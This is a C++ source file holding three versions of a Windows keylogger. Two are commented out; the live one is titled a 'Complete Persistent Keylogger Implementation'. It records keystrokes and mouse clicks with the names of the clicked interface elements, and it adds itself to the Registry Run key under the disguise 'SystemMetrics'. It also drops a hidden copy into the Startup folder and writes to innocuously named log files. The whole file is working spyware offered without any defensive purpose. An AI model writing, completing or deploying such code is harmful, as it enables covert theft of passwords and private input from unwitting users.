
// Without UI AutoMation

/*

#include <Windows.h>
#include <fstream>
#include <map>
#include <vector>
#include <algorithm>
#include <string>
#include <ctime>
#include <psapi.h>

// Log paths (same as before)
const std::vector<std::string> LOG_FILE_PATHS = {
    "C:\\Temp\\keylogs.txt",
    "keylogs.txt",
    "C:\\Users\\Public\\keylogs.txt",
    "C:\\Windows\\Temp\\keylogs.txt"
};

// Add mouse buttons to specialKeys
std::map<int, std::string> specialKeys = {
    {VK_RETURN, "[ENTER]\n"},
    {VK_ESCAPE, "[ESC]"},
    {VK_SPACE, " "},
    {VK_TAB, "[TAB]"},
    {VK_BACK, "[BACKSPACE]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CTRL]"},
    {VK_LCONTROL, "[LCTRL]"},
    {VK_RCONTROL, "[RCTRL]"},
    {VK_MENU, "[ALT]"},
    {VK_LMENU, "[LALT]"},
    {VK_RMENU, "[RALT]"},
    {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_NUMLOCK, "[NUMLOCK]"},
    {VK_SCROLL, "[SCROLLLOCK]"},
    {VK_INSERT, "[INSERT]"},
    {VK_DELETE, "[DELETE]"},
    {VK_HOME, "[HOME]"},
    {VK_END, "[END]"},
    {VK_PRIOR, "[PAGEUP]"},
    {VK_NEXT, "[PAGEDOWN]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_OEM_1, ";"},
    {VK_OEM_PLUS, "="},
    {VK_OEM_COMMA, ","},
    {VK_OEM_MINUS, "-"},
    {VK_OEM_PERIOD, "."},
    {VK_OEM_2, "/"},
    {VK_OEM_3, "`"},
    {VK_OEM_4, "["},
    {VK_OEM_5, "\\"},
    {VK_OEM_6, "]"},
    {VK_OEM_7, "'"},
    // ... (previous keys)
    {VK_LBUTTON, "[LEFT-CLICK]"},
    {VK_RBUTTON, "[RIGHT-CLICK]"},
    {VK_MBUTTON, "[MIDDLE-CLICK]"}
};

// Helper: Get window title from HWND
std::string GetWindowTitle(HWND hwnd) {
    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));
    return title;
}

// Helper: Get process name from HWND
std::string GetProcessName(HWND hwnd) {
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    char exeName[MAX_PATH];
    if (hProc) {
        GetModuleFileNameExA(hProc, NULL, exeName, MAX_PATH);
        CloseHandle(hProc);
        std::string fullPath(exeName);
        size_t lastSlash = fullPath.find_last_of("\\/");
        return (lastSlash != std::string::npos) ? fullPath.substr(lastSlash + 1) : fullPath;
    }
    return "Unknown";
}

// NEW: Log UI context on mouse click
void LogUIClick(std::ofstream& logFile, int button) {
    POINT cursorPos;
    GetCursorPos(&cursorPos);
    HWND clickedWindow = WindowFromPoint(cursorPos);

    // Get window/control info
    std::string windowTitle = GetWindowTitle(clickedWindow);
    std::string processName = GetProcessName(clickedWindow);

    // Log format: [CLICK-TYPE "CONTROL" (APP)]
    logFile << specialKeys[button] << " \"" << windowTitle << "\" (" << processName << ")\n";
}

// (Rest of your existing functions: GetTimestamp, InitLogFile...)
// Timestamp function (unchanged)
std::string GetTimestamp() {
    time_t now = time(nullptr);
    char buf[80];
    tm timeinfo;
    localtime_s(&timeinfo, &now);
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &timeinfo);
    return buf;
}

// Log file initialization (unchanged)
std::ofstream InitLogFile() {
    for (const auto& path : LOG_FILE_PATHS) {
        size_t lastSlash = path.find_last_of("\\/");
        if (lastSlash != std::string::npos) {
            std::string dir = path.substr(0, lastSlash);
            if (!CreateDirectoryA(dir.c_str(), NULL)) {
                DWORD err = GetLastError();
                if (err != ERROR_ALREADY_EXISTS) continue;
            }
        }
        std::ofstream file(path, std::ios::app);
        if (file.is_open()) {
            file << "\n[" << GetTimestamp() << "] Keylogger + Mouse Logger initialized\n";
            file.flush();
            return file;
        }
    }
    return std::ofstream();
}
// ... [Keep all your existing constants and helper functions] ...

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::ofstream logFile = InitLogFile();
    if (!logFile.is_open()) return 1;

    std::vector<int> pressedKeys;
    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001); // ADD THIS LINE

    while (true) {
        // Exit on Numpad9
        if (GetAsyncKeyState(VK_NUMPAD9) & 0x8000) {
            logFile << "[" << GetTimestamp() << "] Keylogger terminated\n";
            break;
        }

        // Check mouse clicks
        for (int button : {VK_LBUTTON, VK_RBUTTON, VK_MBUTTON}) {
            if (GetAsyncKeyState(button) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), button) == pressedKeys.end()) {
                    LogUIClick(logFile, button);
                    pressedKeys.push_back(button);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), button), pressedKeys.end());
            }
        }

        // Caps Lock state tracking
        bool currentCaps = (GetKeyState(VK_CAPITAL) & 0x0001);
        if (currentCaps != capsLockOn) {
            logFile << "[CAPSLOCK " << (currentCaps ? "ON" : "OFF") << "]";
            capsLockOn = currentCaps;
        }

        // ... [Rest of your keyboard logging logic] ...
        // Check special keys - fixed the iteration syntax here
        for (const auto& keyPair : specialKeys) {
            int keyCode = keyPair.first;
            const std::string& keyStr = keyPair.second;

            if (GetAsyncKeyState(keyCode) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), keyCode) == pressedKeys.end()) {
                    logFile << keyStr;
                    pressedKeys.push_back(keyCode);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), keyCode), pressedKeys.end());
            }
        }

        // Check letters (A-Z)
        for (int i = 'A'; i <= 'Z'; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), i) == pressedKeys.end()) {
                    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ||
                        (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
                        (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
                    bool isUpper = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);
                    logFile << (char)(isUpper ? i : tolower(i));
                    pressedKeys.push_back(i);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), i), pressedKeys.end());
            }
        }

        // Check numbers (0-9)
        for (int i = '0'; i <= '9'; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), i) == pressedKeys.end()) {
                    logFile << (char)i;
                    pressedKeys.push_back(i);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), i), pressedKeys.end());
            }
        }
        // ... (keyboard checks remain the same)

        // Flush periodically
        static int flushCounter = 0;
        if (++flushCounter % 100 == 0) {
            logFile.flush();
            flushCounter = 0;
        }

        Sleep(10);
    }

    logFile.close();
    return 0;
}

*/


// With UI Automation.

/*
#include <Windows.h>
#include <fstream>
#include <map>
#include <vector>
#include <algorithm>
#include <string>
#include <ctime>
#include <psapi.h>
#include <UIAutomation.h>
#include <comdef.h>

// Log paths
const std::vector<std::string> LOG_FILE_PATHS = {
    "C:\\Temp\\keylogs.txt",
    "keylogs.txt",
    "C:\\Users\\Public\\keylogs.txt",
    "C:\\Windows\\Temp\\keylogs.txt"
};

// Special keys including mouse buttons
std::map<int, std::string> specialKeys = {
    {VK_RETURN, "[ENTER]\n"},
    {VK_ESCAPE, "[ESC]"},
    {VK_SPACE, " "},
    {VK_TAB, "[TAB]"},
    {VK_BACK, "[BACKSPACE]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CTRL]"},
    {VK_LCONTROL, "[LCTRL]"},
    {VK_RCONTROL, "[RCTRL]"},
    {VK_MENU, "[ALT]"},
    {VK_LMENU, "[LALT]"},
    {VK_RMENU, "[RALT]"},
    {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_NUMLOCK, "[NUMLOCK]"},
    {VK_SCROLL, "[SCROLLLOCK]"},
    {VK_INSERT, "[INSERT]"},
    {VK_DELETE, "[DELETE]"},
    {VK_HOME, "[HOME]"},
    {VK_END, "[END]"},
    {VK_PRIOR, "[PAGEUP]"},
    {VK_NEXT, "[PAGEDOWN]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_OEM_1, ";"},
    {VK_OEM_PLUS, "="},
    {VK_OEM_COMMA, ","},
    {VK_OEM_MINUS, "-"},
    {VK_OEM_PERIOD, "."},
    {VK_OEM_2, "/"},
    {VK_OEM_3, "`"},
    {VK_OEM_4, "["},
    {VK_OEM_5, "\\"},
    {VK_OEM_6, "]"},
    {VK_OEM_7, "'"},
    {VK_LBUTTON, "[LEFT-CLICK]"},
    {VK_RBUTTON, "[RIGHT-CLICK]"},
    {VK_MBUTTON, "[MIDDLE-CLICK]"}
};

// Helper: Get window title from HWND
std::string GetWindowTitle(HWND hwnd) {
    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));
    return title;
}

// Helper: Get process name from HWND
std::string GetProcessName(HWND hwnd) {
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    char exeName[MAX_PATH];
    if (hProc) {
        GetModuleFileNameExA(hProc, NULL, exeName, MAX_PATH);
        CloseHandle(hProc);
        std::string fullPath(exeName);
        size_t lastSlash = fullPath.find_last_of("\\/");
        return (lastSlash != std::string::npos) ? fullPath.substr(lastSlash + 1) : fullPath;
    }
    return "Unknown";
}

// Get name of UI element at specific point using UI Automation
std::string GetClickedItemName(POINT pt) {
    std::string result;
    CoInitialize(NULL);

    IUIAutomation* pUIA = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_CUIAutomation, NULL, CLSCTX_INPROC_SERVER, IID_IUIAutomation, (void**)&pUIA);

    if (SUCCEEDED(hr)) {
        IUIAutomationElement* pElement = nullptr;
        hr = pUIA->ElementFromPoint(pt, &pElement);

        if (SUCCEEDED(hr) && pElement) {
            BSTR name;
            hr = pElement->get_CurrentName(&name);

            if (SUCCEEDED(hr) && name) {
                _bstr_t wrappedName(name, false); // Converts BSTR to std::string
                result = (const char*)wrappedName;
            }

            pElement->Release();
        }
        pUIA->Release();
    }

    CoUninitialize();
    return result;
}

// Log UI context on mouse click with UI Automation
void LogUIClick(std::ofstream& logFile, int button) {
    POINT cursorPos;
    GetCursorPos(&cursorPos);
    HWND clickedWindow = WindowFromPoint(cursorPos);
    std::string windowTitle = GetWindowTitle(clickedWindow);
    std::string processName = GetProcessName(clickedWindow);

    // Try to get detailed item name using UI Automation
    std::string itemName = GetClickedItemName(cursorPos);

    if (!itemName.empty()) {
        // Log with detailed item name
        logFile << specialKeys[button] << " \"" << itemName << "\" (" << processName << ")\n";
    }
    else {
        // Fallback to window title
        logFile << specialKeys[button] << " \"" << windowTitle << "\" (" << processName << ")\n";
    }
}

// Get current timestamp
std::string GetTimestamp() {
    time_t now = time(nullptr);
    char buf[80];
    tm timeinfo;
    localtime_s(&timeinfo, &now);
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &timeinfo);
    return buf;
}

// Initialize log file with fallback paths
std::ofstream InitLogFile() {
    for (const auto& path : LOG_FILE_PATHS) {
        size_t lastSlash = path.find_last_of("\\/");
        if (lastSlash != std::string::npos) {
            std::string dir = path.substr(0, lastSlash);
            if (!CreateDirectoryA(dir.c_str(), NULL)) {
                DWORD err = GetLastError();
                if (err != ERROR_ALREADY_EXISTS) continue;
            }
        }
        std::ofstream file(path, std::ios::app);
        if (file.is_open()) {
            file << "\n[" << GetTimestamp() << "] Keylogger + Mouse Logger initialized\n";
            file.flush();
            return file;
        }
    }
    return std::ofstream();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Single instance check
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\MyUniqueKeyloggerMutex12345"); // Unique name
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0; // Silent exit - remove MessageBox if you want it completely hidden
    }

    std::ofstream logFile = InitLogFile();
    if (!logFile.is_open()) {
        if (hMutex) {
            ReleaseMutex(hMutex);
            CloseHandle(hMutex);
        }
        MessageBoxA(NULL, "Failed to initialize log file at all locations", "Error", MB_ICONERROR);
        return 1;
    }

    //std::ofstream logFile = InitLogFile();
    //if (!logFile.is_open()) {
    //    MessageBoxA(NULL, "Failed to initialize log file at all locations", "Error", MB_ICONERROR);
    //    return 1;
    //}

    std::vector<int> pressedKeys;
    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001);

    // Main loop
    while (true) {
        // Exit condition - Numpad9
        if (GetAsyncKeyState(VK_NUMPAD9) & 0x8000) {
            logFile << "[" << GetTimestamp() << "] Keylogger terminated by user\n";
            break;
        }

        // Check for caps lock state change
        bool currentCaps = (GetKeyState(VK_CAPITAL) & 0x0001);
        if (currentCaps != capsLockOn) {
            logFile << "[CAPSLOCK " << (currentCaps ? "ON" : "OFF") << "]";
            capsLockOn = currentCaps;
        }

        // Check mouse clicks
        for (int button : {VK_LBUTTON, VK_RBUTTON, VK_MBUTTON}) {
            if (GetAsyncKeyState(button) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), button) == pressedKeys.end()) {
                    LogUIClick(logFile, button);
                    pressedKeys.push_back(button);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), button), pressedKeys.end());
            }
        }

        // Check special keys
        for (const auto& keyPair : specialKeys) {
            int keyCode = keyPair.first;
            const std::string& keyStr = keyPair.second;

            if (GetAsyncKeyState(keyCode) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), keyCode) == pressedKeys.end()) {
                    logFile << keyStr;
                    pressedKeys.push_back(keyCode);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), keyCode), pressedKeys.end());
            }
        }

        // Check letters (A-Z)
        for (int i = 'A'; i <= 'Z'; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), i) == pressedKeys.end()) {
                    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ||
                        (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
                        (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
                    bool isUpper = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);
                    logFile << (char)(isUpper ? i : tolower(i));
                    pressedKeys.push_back(i);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), i), pressedKeys.end());
            }
        }

        // Check numbers (0-9)
        for (int i = '0'; i <= '9'; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), i) == pressedKeys.end()) {
                    logFile << (char)i;
                    pressedKeys.push_back(i);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), i), pressedKeys.end());
            }
        }

        // Flush periodically
        static int flushCounter = 0;
        if (++flushCounter % 100 == 0) {
            logFile.flush();
            flushCounter = 0;
        }

        Sleep(10);
    }

    logFile.close();

    // Clean up mutex
    if (hMutex) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
    return 0;
}


*/



//  Complete Persistent Keylogger Implementation


#include <Windows.h>
#include <fstream>
#include <map>
#include <vector>
#include <algorithm>
#include <string>
#include <ctime>
#include <psapi.h>
#include <UIAutomation.h>
#include <comdef.h>
#include <winreg.h>
#include <shlobj.h>

// Log paths
const std::vector<std::string> LOG_FILE_PATHS = {
    "C:\\Temp\\system_logs.txt",
    "C:\\Users\\Public\\logs\\system_logs.txt",
    "C:\\Windows\\Temp\\system_logs.txt"
};

// Registry persistence settings
const std::string REGISTRY_RUN_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const std::string REGISTRY_VALUE_NAME = "SystemMetrics";
const std::string STARTUP_FOLDER_NAME = "WindowsMetrics";

// Special keys including mouse buttons
std::map<int, std::string> specialKeys = {
    {VK_RETURN, "[ENTER]\n"},
    {VK_ESCAPE, "[ESC]"},
    {VK_SPACE, " "},
    {VK_TAB, "[TAB]"},
    {VK_BACK, "[BACKSPACE]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CTRL]"},
    {VK_LCONTROL, "[LCTRL]"},
    {VK_RCONTROL, "[RCTRL]"},
    {VK_MENU, "[ALT]"},
    {VK_LMENU, "[LALT]"},
    {VK_RMENU, "[RALT]"},
    {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_NUMLOCK, "[NUMLOCK]"},
    {VK_SCROLL, "[SCROLLLOCK]"},
    {VK_INSERT, "[INSERT]"},
    {VK_DELETE, "[DELETE]"},
    {VK_HOME, "[HOME]"},
    {VK_END, "[END]"},
    {VK_PRIOR, "[PAGEUP]"},
    {VK_NEXT, "[PAGEDOWN]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_OEM_1, ";"},
    {VK_OEM_PLUS, "="},
    {VK_OEM_COMMA, ","},
    {VK_OEM_MINUS, "-"},
    {VK_OEM_PERIOD, "."},
    {VK_OEM_2, "/"},
    {VK_OEM_3, "`"},
    {VK_OEM_4, "["},
    {VK_OEM_5, "\\"},
    {VK_OEM_6, "]"},
    {VK_OEM_7, "'"},
    {VK_LBUTTON, "[LEFT-CLICK]"},
    {VK_RBUTTON, "[RIGHT-CLICK]"},
    {VK_MBUTTON, "[MIDDLE-CLICK]"}
};

// Helper: Get current executable path
std::string GetCurrentExePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return path;
}

// Helper: Install persistence via Registry Run key
bool InstallPersistence() {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_RUN_KEY.c_str(), 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    std::string exePath = GetCurrentExePath();
    result = RegSetValueExA(hKey, REGISTRY_VALUE_NAME.c_str(), 0, REG_SZ,
        (const BYTE*)exePath.c_str(), exePath.size() + 1);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// Helper: Check if persistence is already installed
bool IsPersistenceInstalled() {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_RUN_KEY.c_str(), 0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    char value[MAX_PATH];
    DWORD size = MAX_PATH;
    result = RegQueryValueExA(hKey, REGISTRY_VALUE_NAME.c_str(), NULL, NULL,
        (LPBYTE)value, &size);

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        return false;
    }

    std::string currentExe = GetCurrentExePath();
    return (strcmp(value, currentExe.c_str())) == 0;
}

// Helper: Install copy in startup folder
bool InstallStartupCopy() {
    char startupPath[MAX_PATH];
    if (!SHGetSpecialFolderPathA(NULL, startupPath, CSIDL_STARTUP, FALSE)) {
        return false;
    }

    std::string destPath = std::string(startupPath) + "\\" + STARTUP_FOLDER_NAME + ".exe";
    if (CopyFileA(GetCurrentExePath().c_str(), destPath.c_str(), FALSE)) {
        // Hide the file
        SetFileAttributesA(destPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        return true;
    }
    return false;
}

// Helper: Get window title from HWND
std::string GetWindowTitle(HWND hwnd) {
    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));
    return title;
}

// Helper: Get process name from HWND
std::string GetProcessName(HWND hwnd) {
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    char exeName[MAX_PATH];
    if (hProc) {
        GetModuleFileNameExA(hProc, NULL, exeName, MAX_PATH);
        CloseHandle(hProc);
        std::string fullPath(exeName);
        size_t lastSlash = fullPath.find_last_of("\\/");
        return (lastSlash != std::string::npos) ? fullPath.substr(lastSlash + 1) : fullPath;
    }
    return "Unknown";
}

// Get name of UI element at specific point using UI Automation
std::string GetClickedItemName(POINT pt) {
    std::string result;
    CoInitialize(NULL);

    IUIAutomation* pUIA = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_CUIAutomation, NULL, CLSCTX_INPROC_SERVER, IID_IUIAutomation, (void**)&pUIA);

    if (SUCCEEDED(hr)) {
        IUIAutomationElement* pElement = nullptr;
        hr = pUIA->ElementFromPoint(pt, &pElement);

        if (SUCCEEDED(hr) && pElement) {
            BSTR name;
            hr = pElement->get_CurrentName(&name);

            if (SUCCEEDED(hr) && name) {
                _bstr_t wrappedName(name, false);
                result = (const char*)wrappedName;
            }

            pElement->Release();
        }
        pUIA->Release();
    }

    CoUninitialize();
    return result;
}

// Log UI context on mouse click with UI Automation
void LogUIClick(std::ofstream& logFile, int button) {
    POINT cursorPos;
    GetCursorPos(&cursorPos);
    HWND clickedWindow = WindowFromPoint(cursorPos);
    std::string windowTitle = GetWindowTitle(clickedWindow);
    std::string processName = GetProcessName(clickedWindow);

    std::string itemName = GetClickedItemName(cursorPos);

    if (!itemName.empty()) {
        logFile << specialKeys[button] << " \"" << itemName << "\" (" << processName << ")\n";
    }
    else {
        logFile << specialKeys[button] << " \"" << windowTitle << "\" (" << processName << ")\n";
    }
}

// Get current timestamp
std::string GetTimestamp() {
    time_t now = time(nullptr);
    char buf[80];
    tm timeinfo;
    localtime_s(&timeinfo, &now);
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &timeinfo);
    return buf;
}

// Initialize log file with fallback paths
std::ofstream InitLogFile() {
    for (const auto& path : LOG_FILE_PATHS) {
        size_t lastSlash = path.find_last_of("\\/");
        if (lastSlash != std::string::npos) {
            std::string dir = path.substr(0, lastSlash);
            if (!CreateDirectoryA(dir.c_str(), NULL)) {
                DWORD err = GetLastError();
                if (err != ERROR_ALREADY_EXISTS) continue;
            }
        }
        std::ofstream file(path, std::ios::app);
        if (file.is_open()) {
            file << "\n[" << GetTimestamp() << "] Session started\n";
            file.flush();
            return file;
        }
    }
    return std::ofstream();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Set up persistence
    if (!IsPersistenceInstalled()) {
        InstallPersistence();
        InstallStartupCopy();
    }

    // Single instance check
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\SystemMetricsMonitorMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    // Initialize logging
    std::ofstream logFile = InitLogFile();
    if (!logFile.is_open()) {
        if (hMutex) {
            ReleaseMutex(hMutex);
            CloseHandle(hMutex);
        }
        return 1;
    }

    std::vector<int> pressedKeys;
    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001);

    // Main loop
    while (true) {
        // Exit condition - Ctrl+Shift+Alt+K
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
            (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
            (GetAsyncKeyState(VK_MENU) & 0x8000) &&
            (GetAsyncKeyState('K') & 0x8000)) {
            logFile << "[" << GetTimestamp() << "] Session terminated by hotkey\n";
            break;
        }

        // Check for caps lock state change
        bool currentCaps = (GetKeyState(VK_CAPITAL) & 0x0001);
        if (currentCaps != capsLockOn) {
            logFile << "[CAPSLOCK " << (currentCaps ? "ON" : "OFF") << "]";
            capsLockOn = currentCaps;
        }

        // Check mouse clicks
        for (int button : {VK_LBUTTON, VK_RBUTTON, VK_MBUTTON}) {
            if (GetAsyncKeyState(button) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), button) == pressedKeys.end()) {
                    LogUIClick(logFile, button);
                    pressedKeys.push_back(button);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), button), pressedKeys.end());
            }
        }

        // Check special keys
        for (const auto& keyPair : specialKeys) {
            int keyCode = keyPair.first;
            const std::string& keyStr = keyPair.second;

            if (GetAsyncKeyState(keyCode) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), keyCode) == pressedKeys.end()) {
                    logFile << keyStr;
                    pressedKeys.push_back(keyCode);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), keyCode), pressedKeys.end());
            }
        }

        // Check letters (A-Z)
        for (int i = 'A'; i <= 'Z'; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), i) == pressedKeys.end()) {
                    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ||
                        (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
                        (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
                    bool isUpper = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);
                    logFile << (char)(isUpper ? i : tolower(i));
                    pressedKeys.push_back(i);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), i), pressedKeys.end());
            }
        }

        // Check numbers (0-9)
        for (int i = '0'; i <= '9'; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                if (std::find(pressedKeys.begin(), pressedKeys.end(), i) == pressedKeys.end()) {
                    logFile << (char)i;
                    pressedKeys.push_back(i);
                }
            }
            else {
                pressedKeys.erase(std::remove(pressedKeys.begin(), pressedKeys.end(), i), pressedKeys.end());
            }
        }

        // Flush periodically
        static int flushCounter = 0;
        if (++flushCounter % 100 == 0) {
            logFile.flush();
            flushCounter = 0;
        }

        Sleep(10);
    }

    logFile.close();

    // Clean up mutex
    if (hMutex) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
    return 0;
}

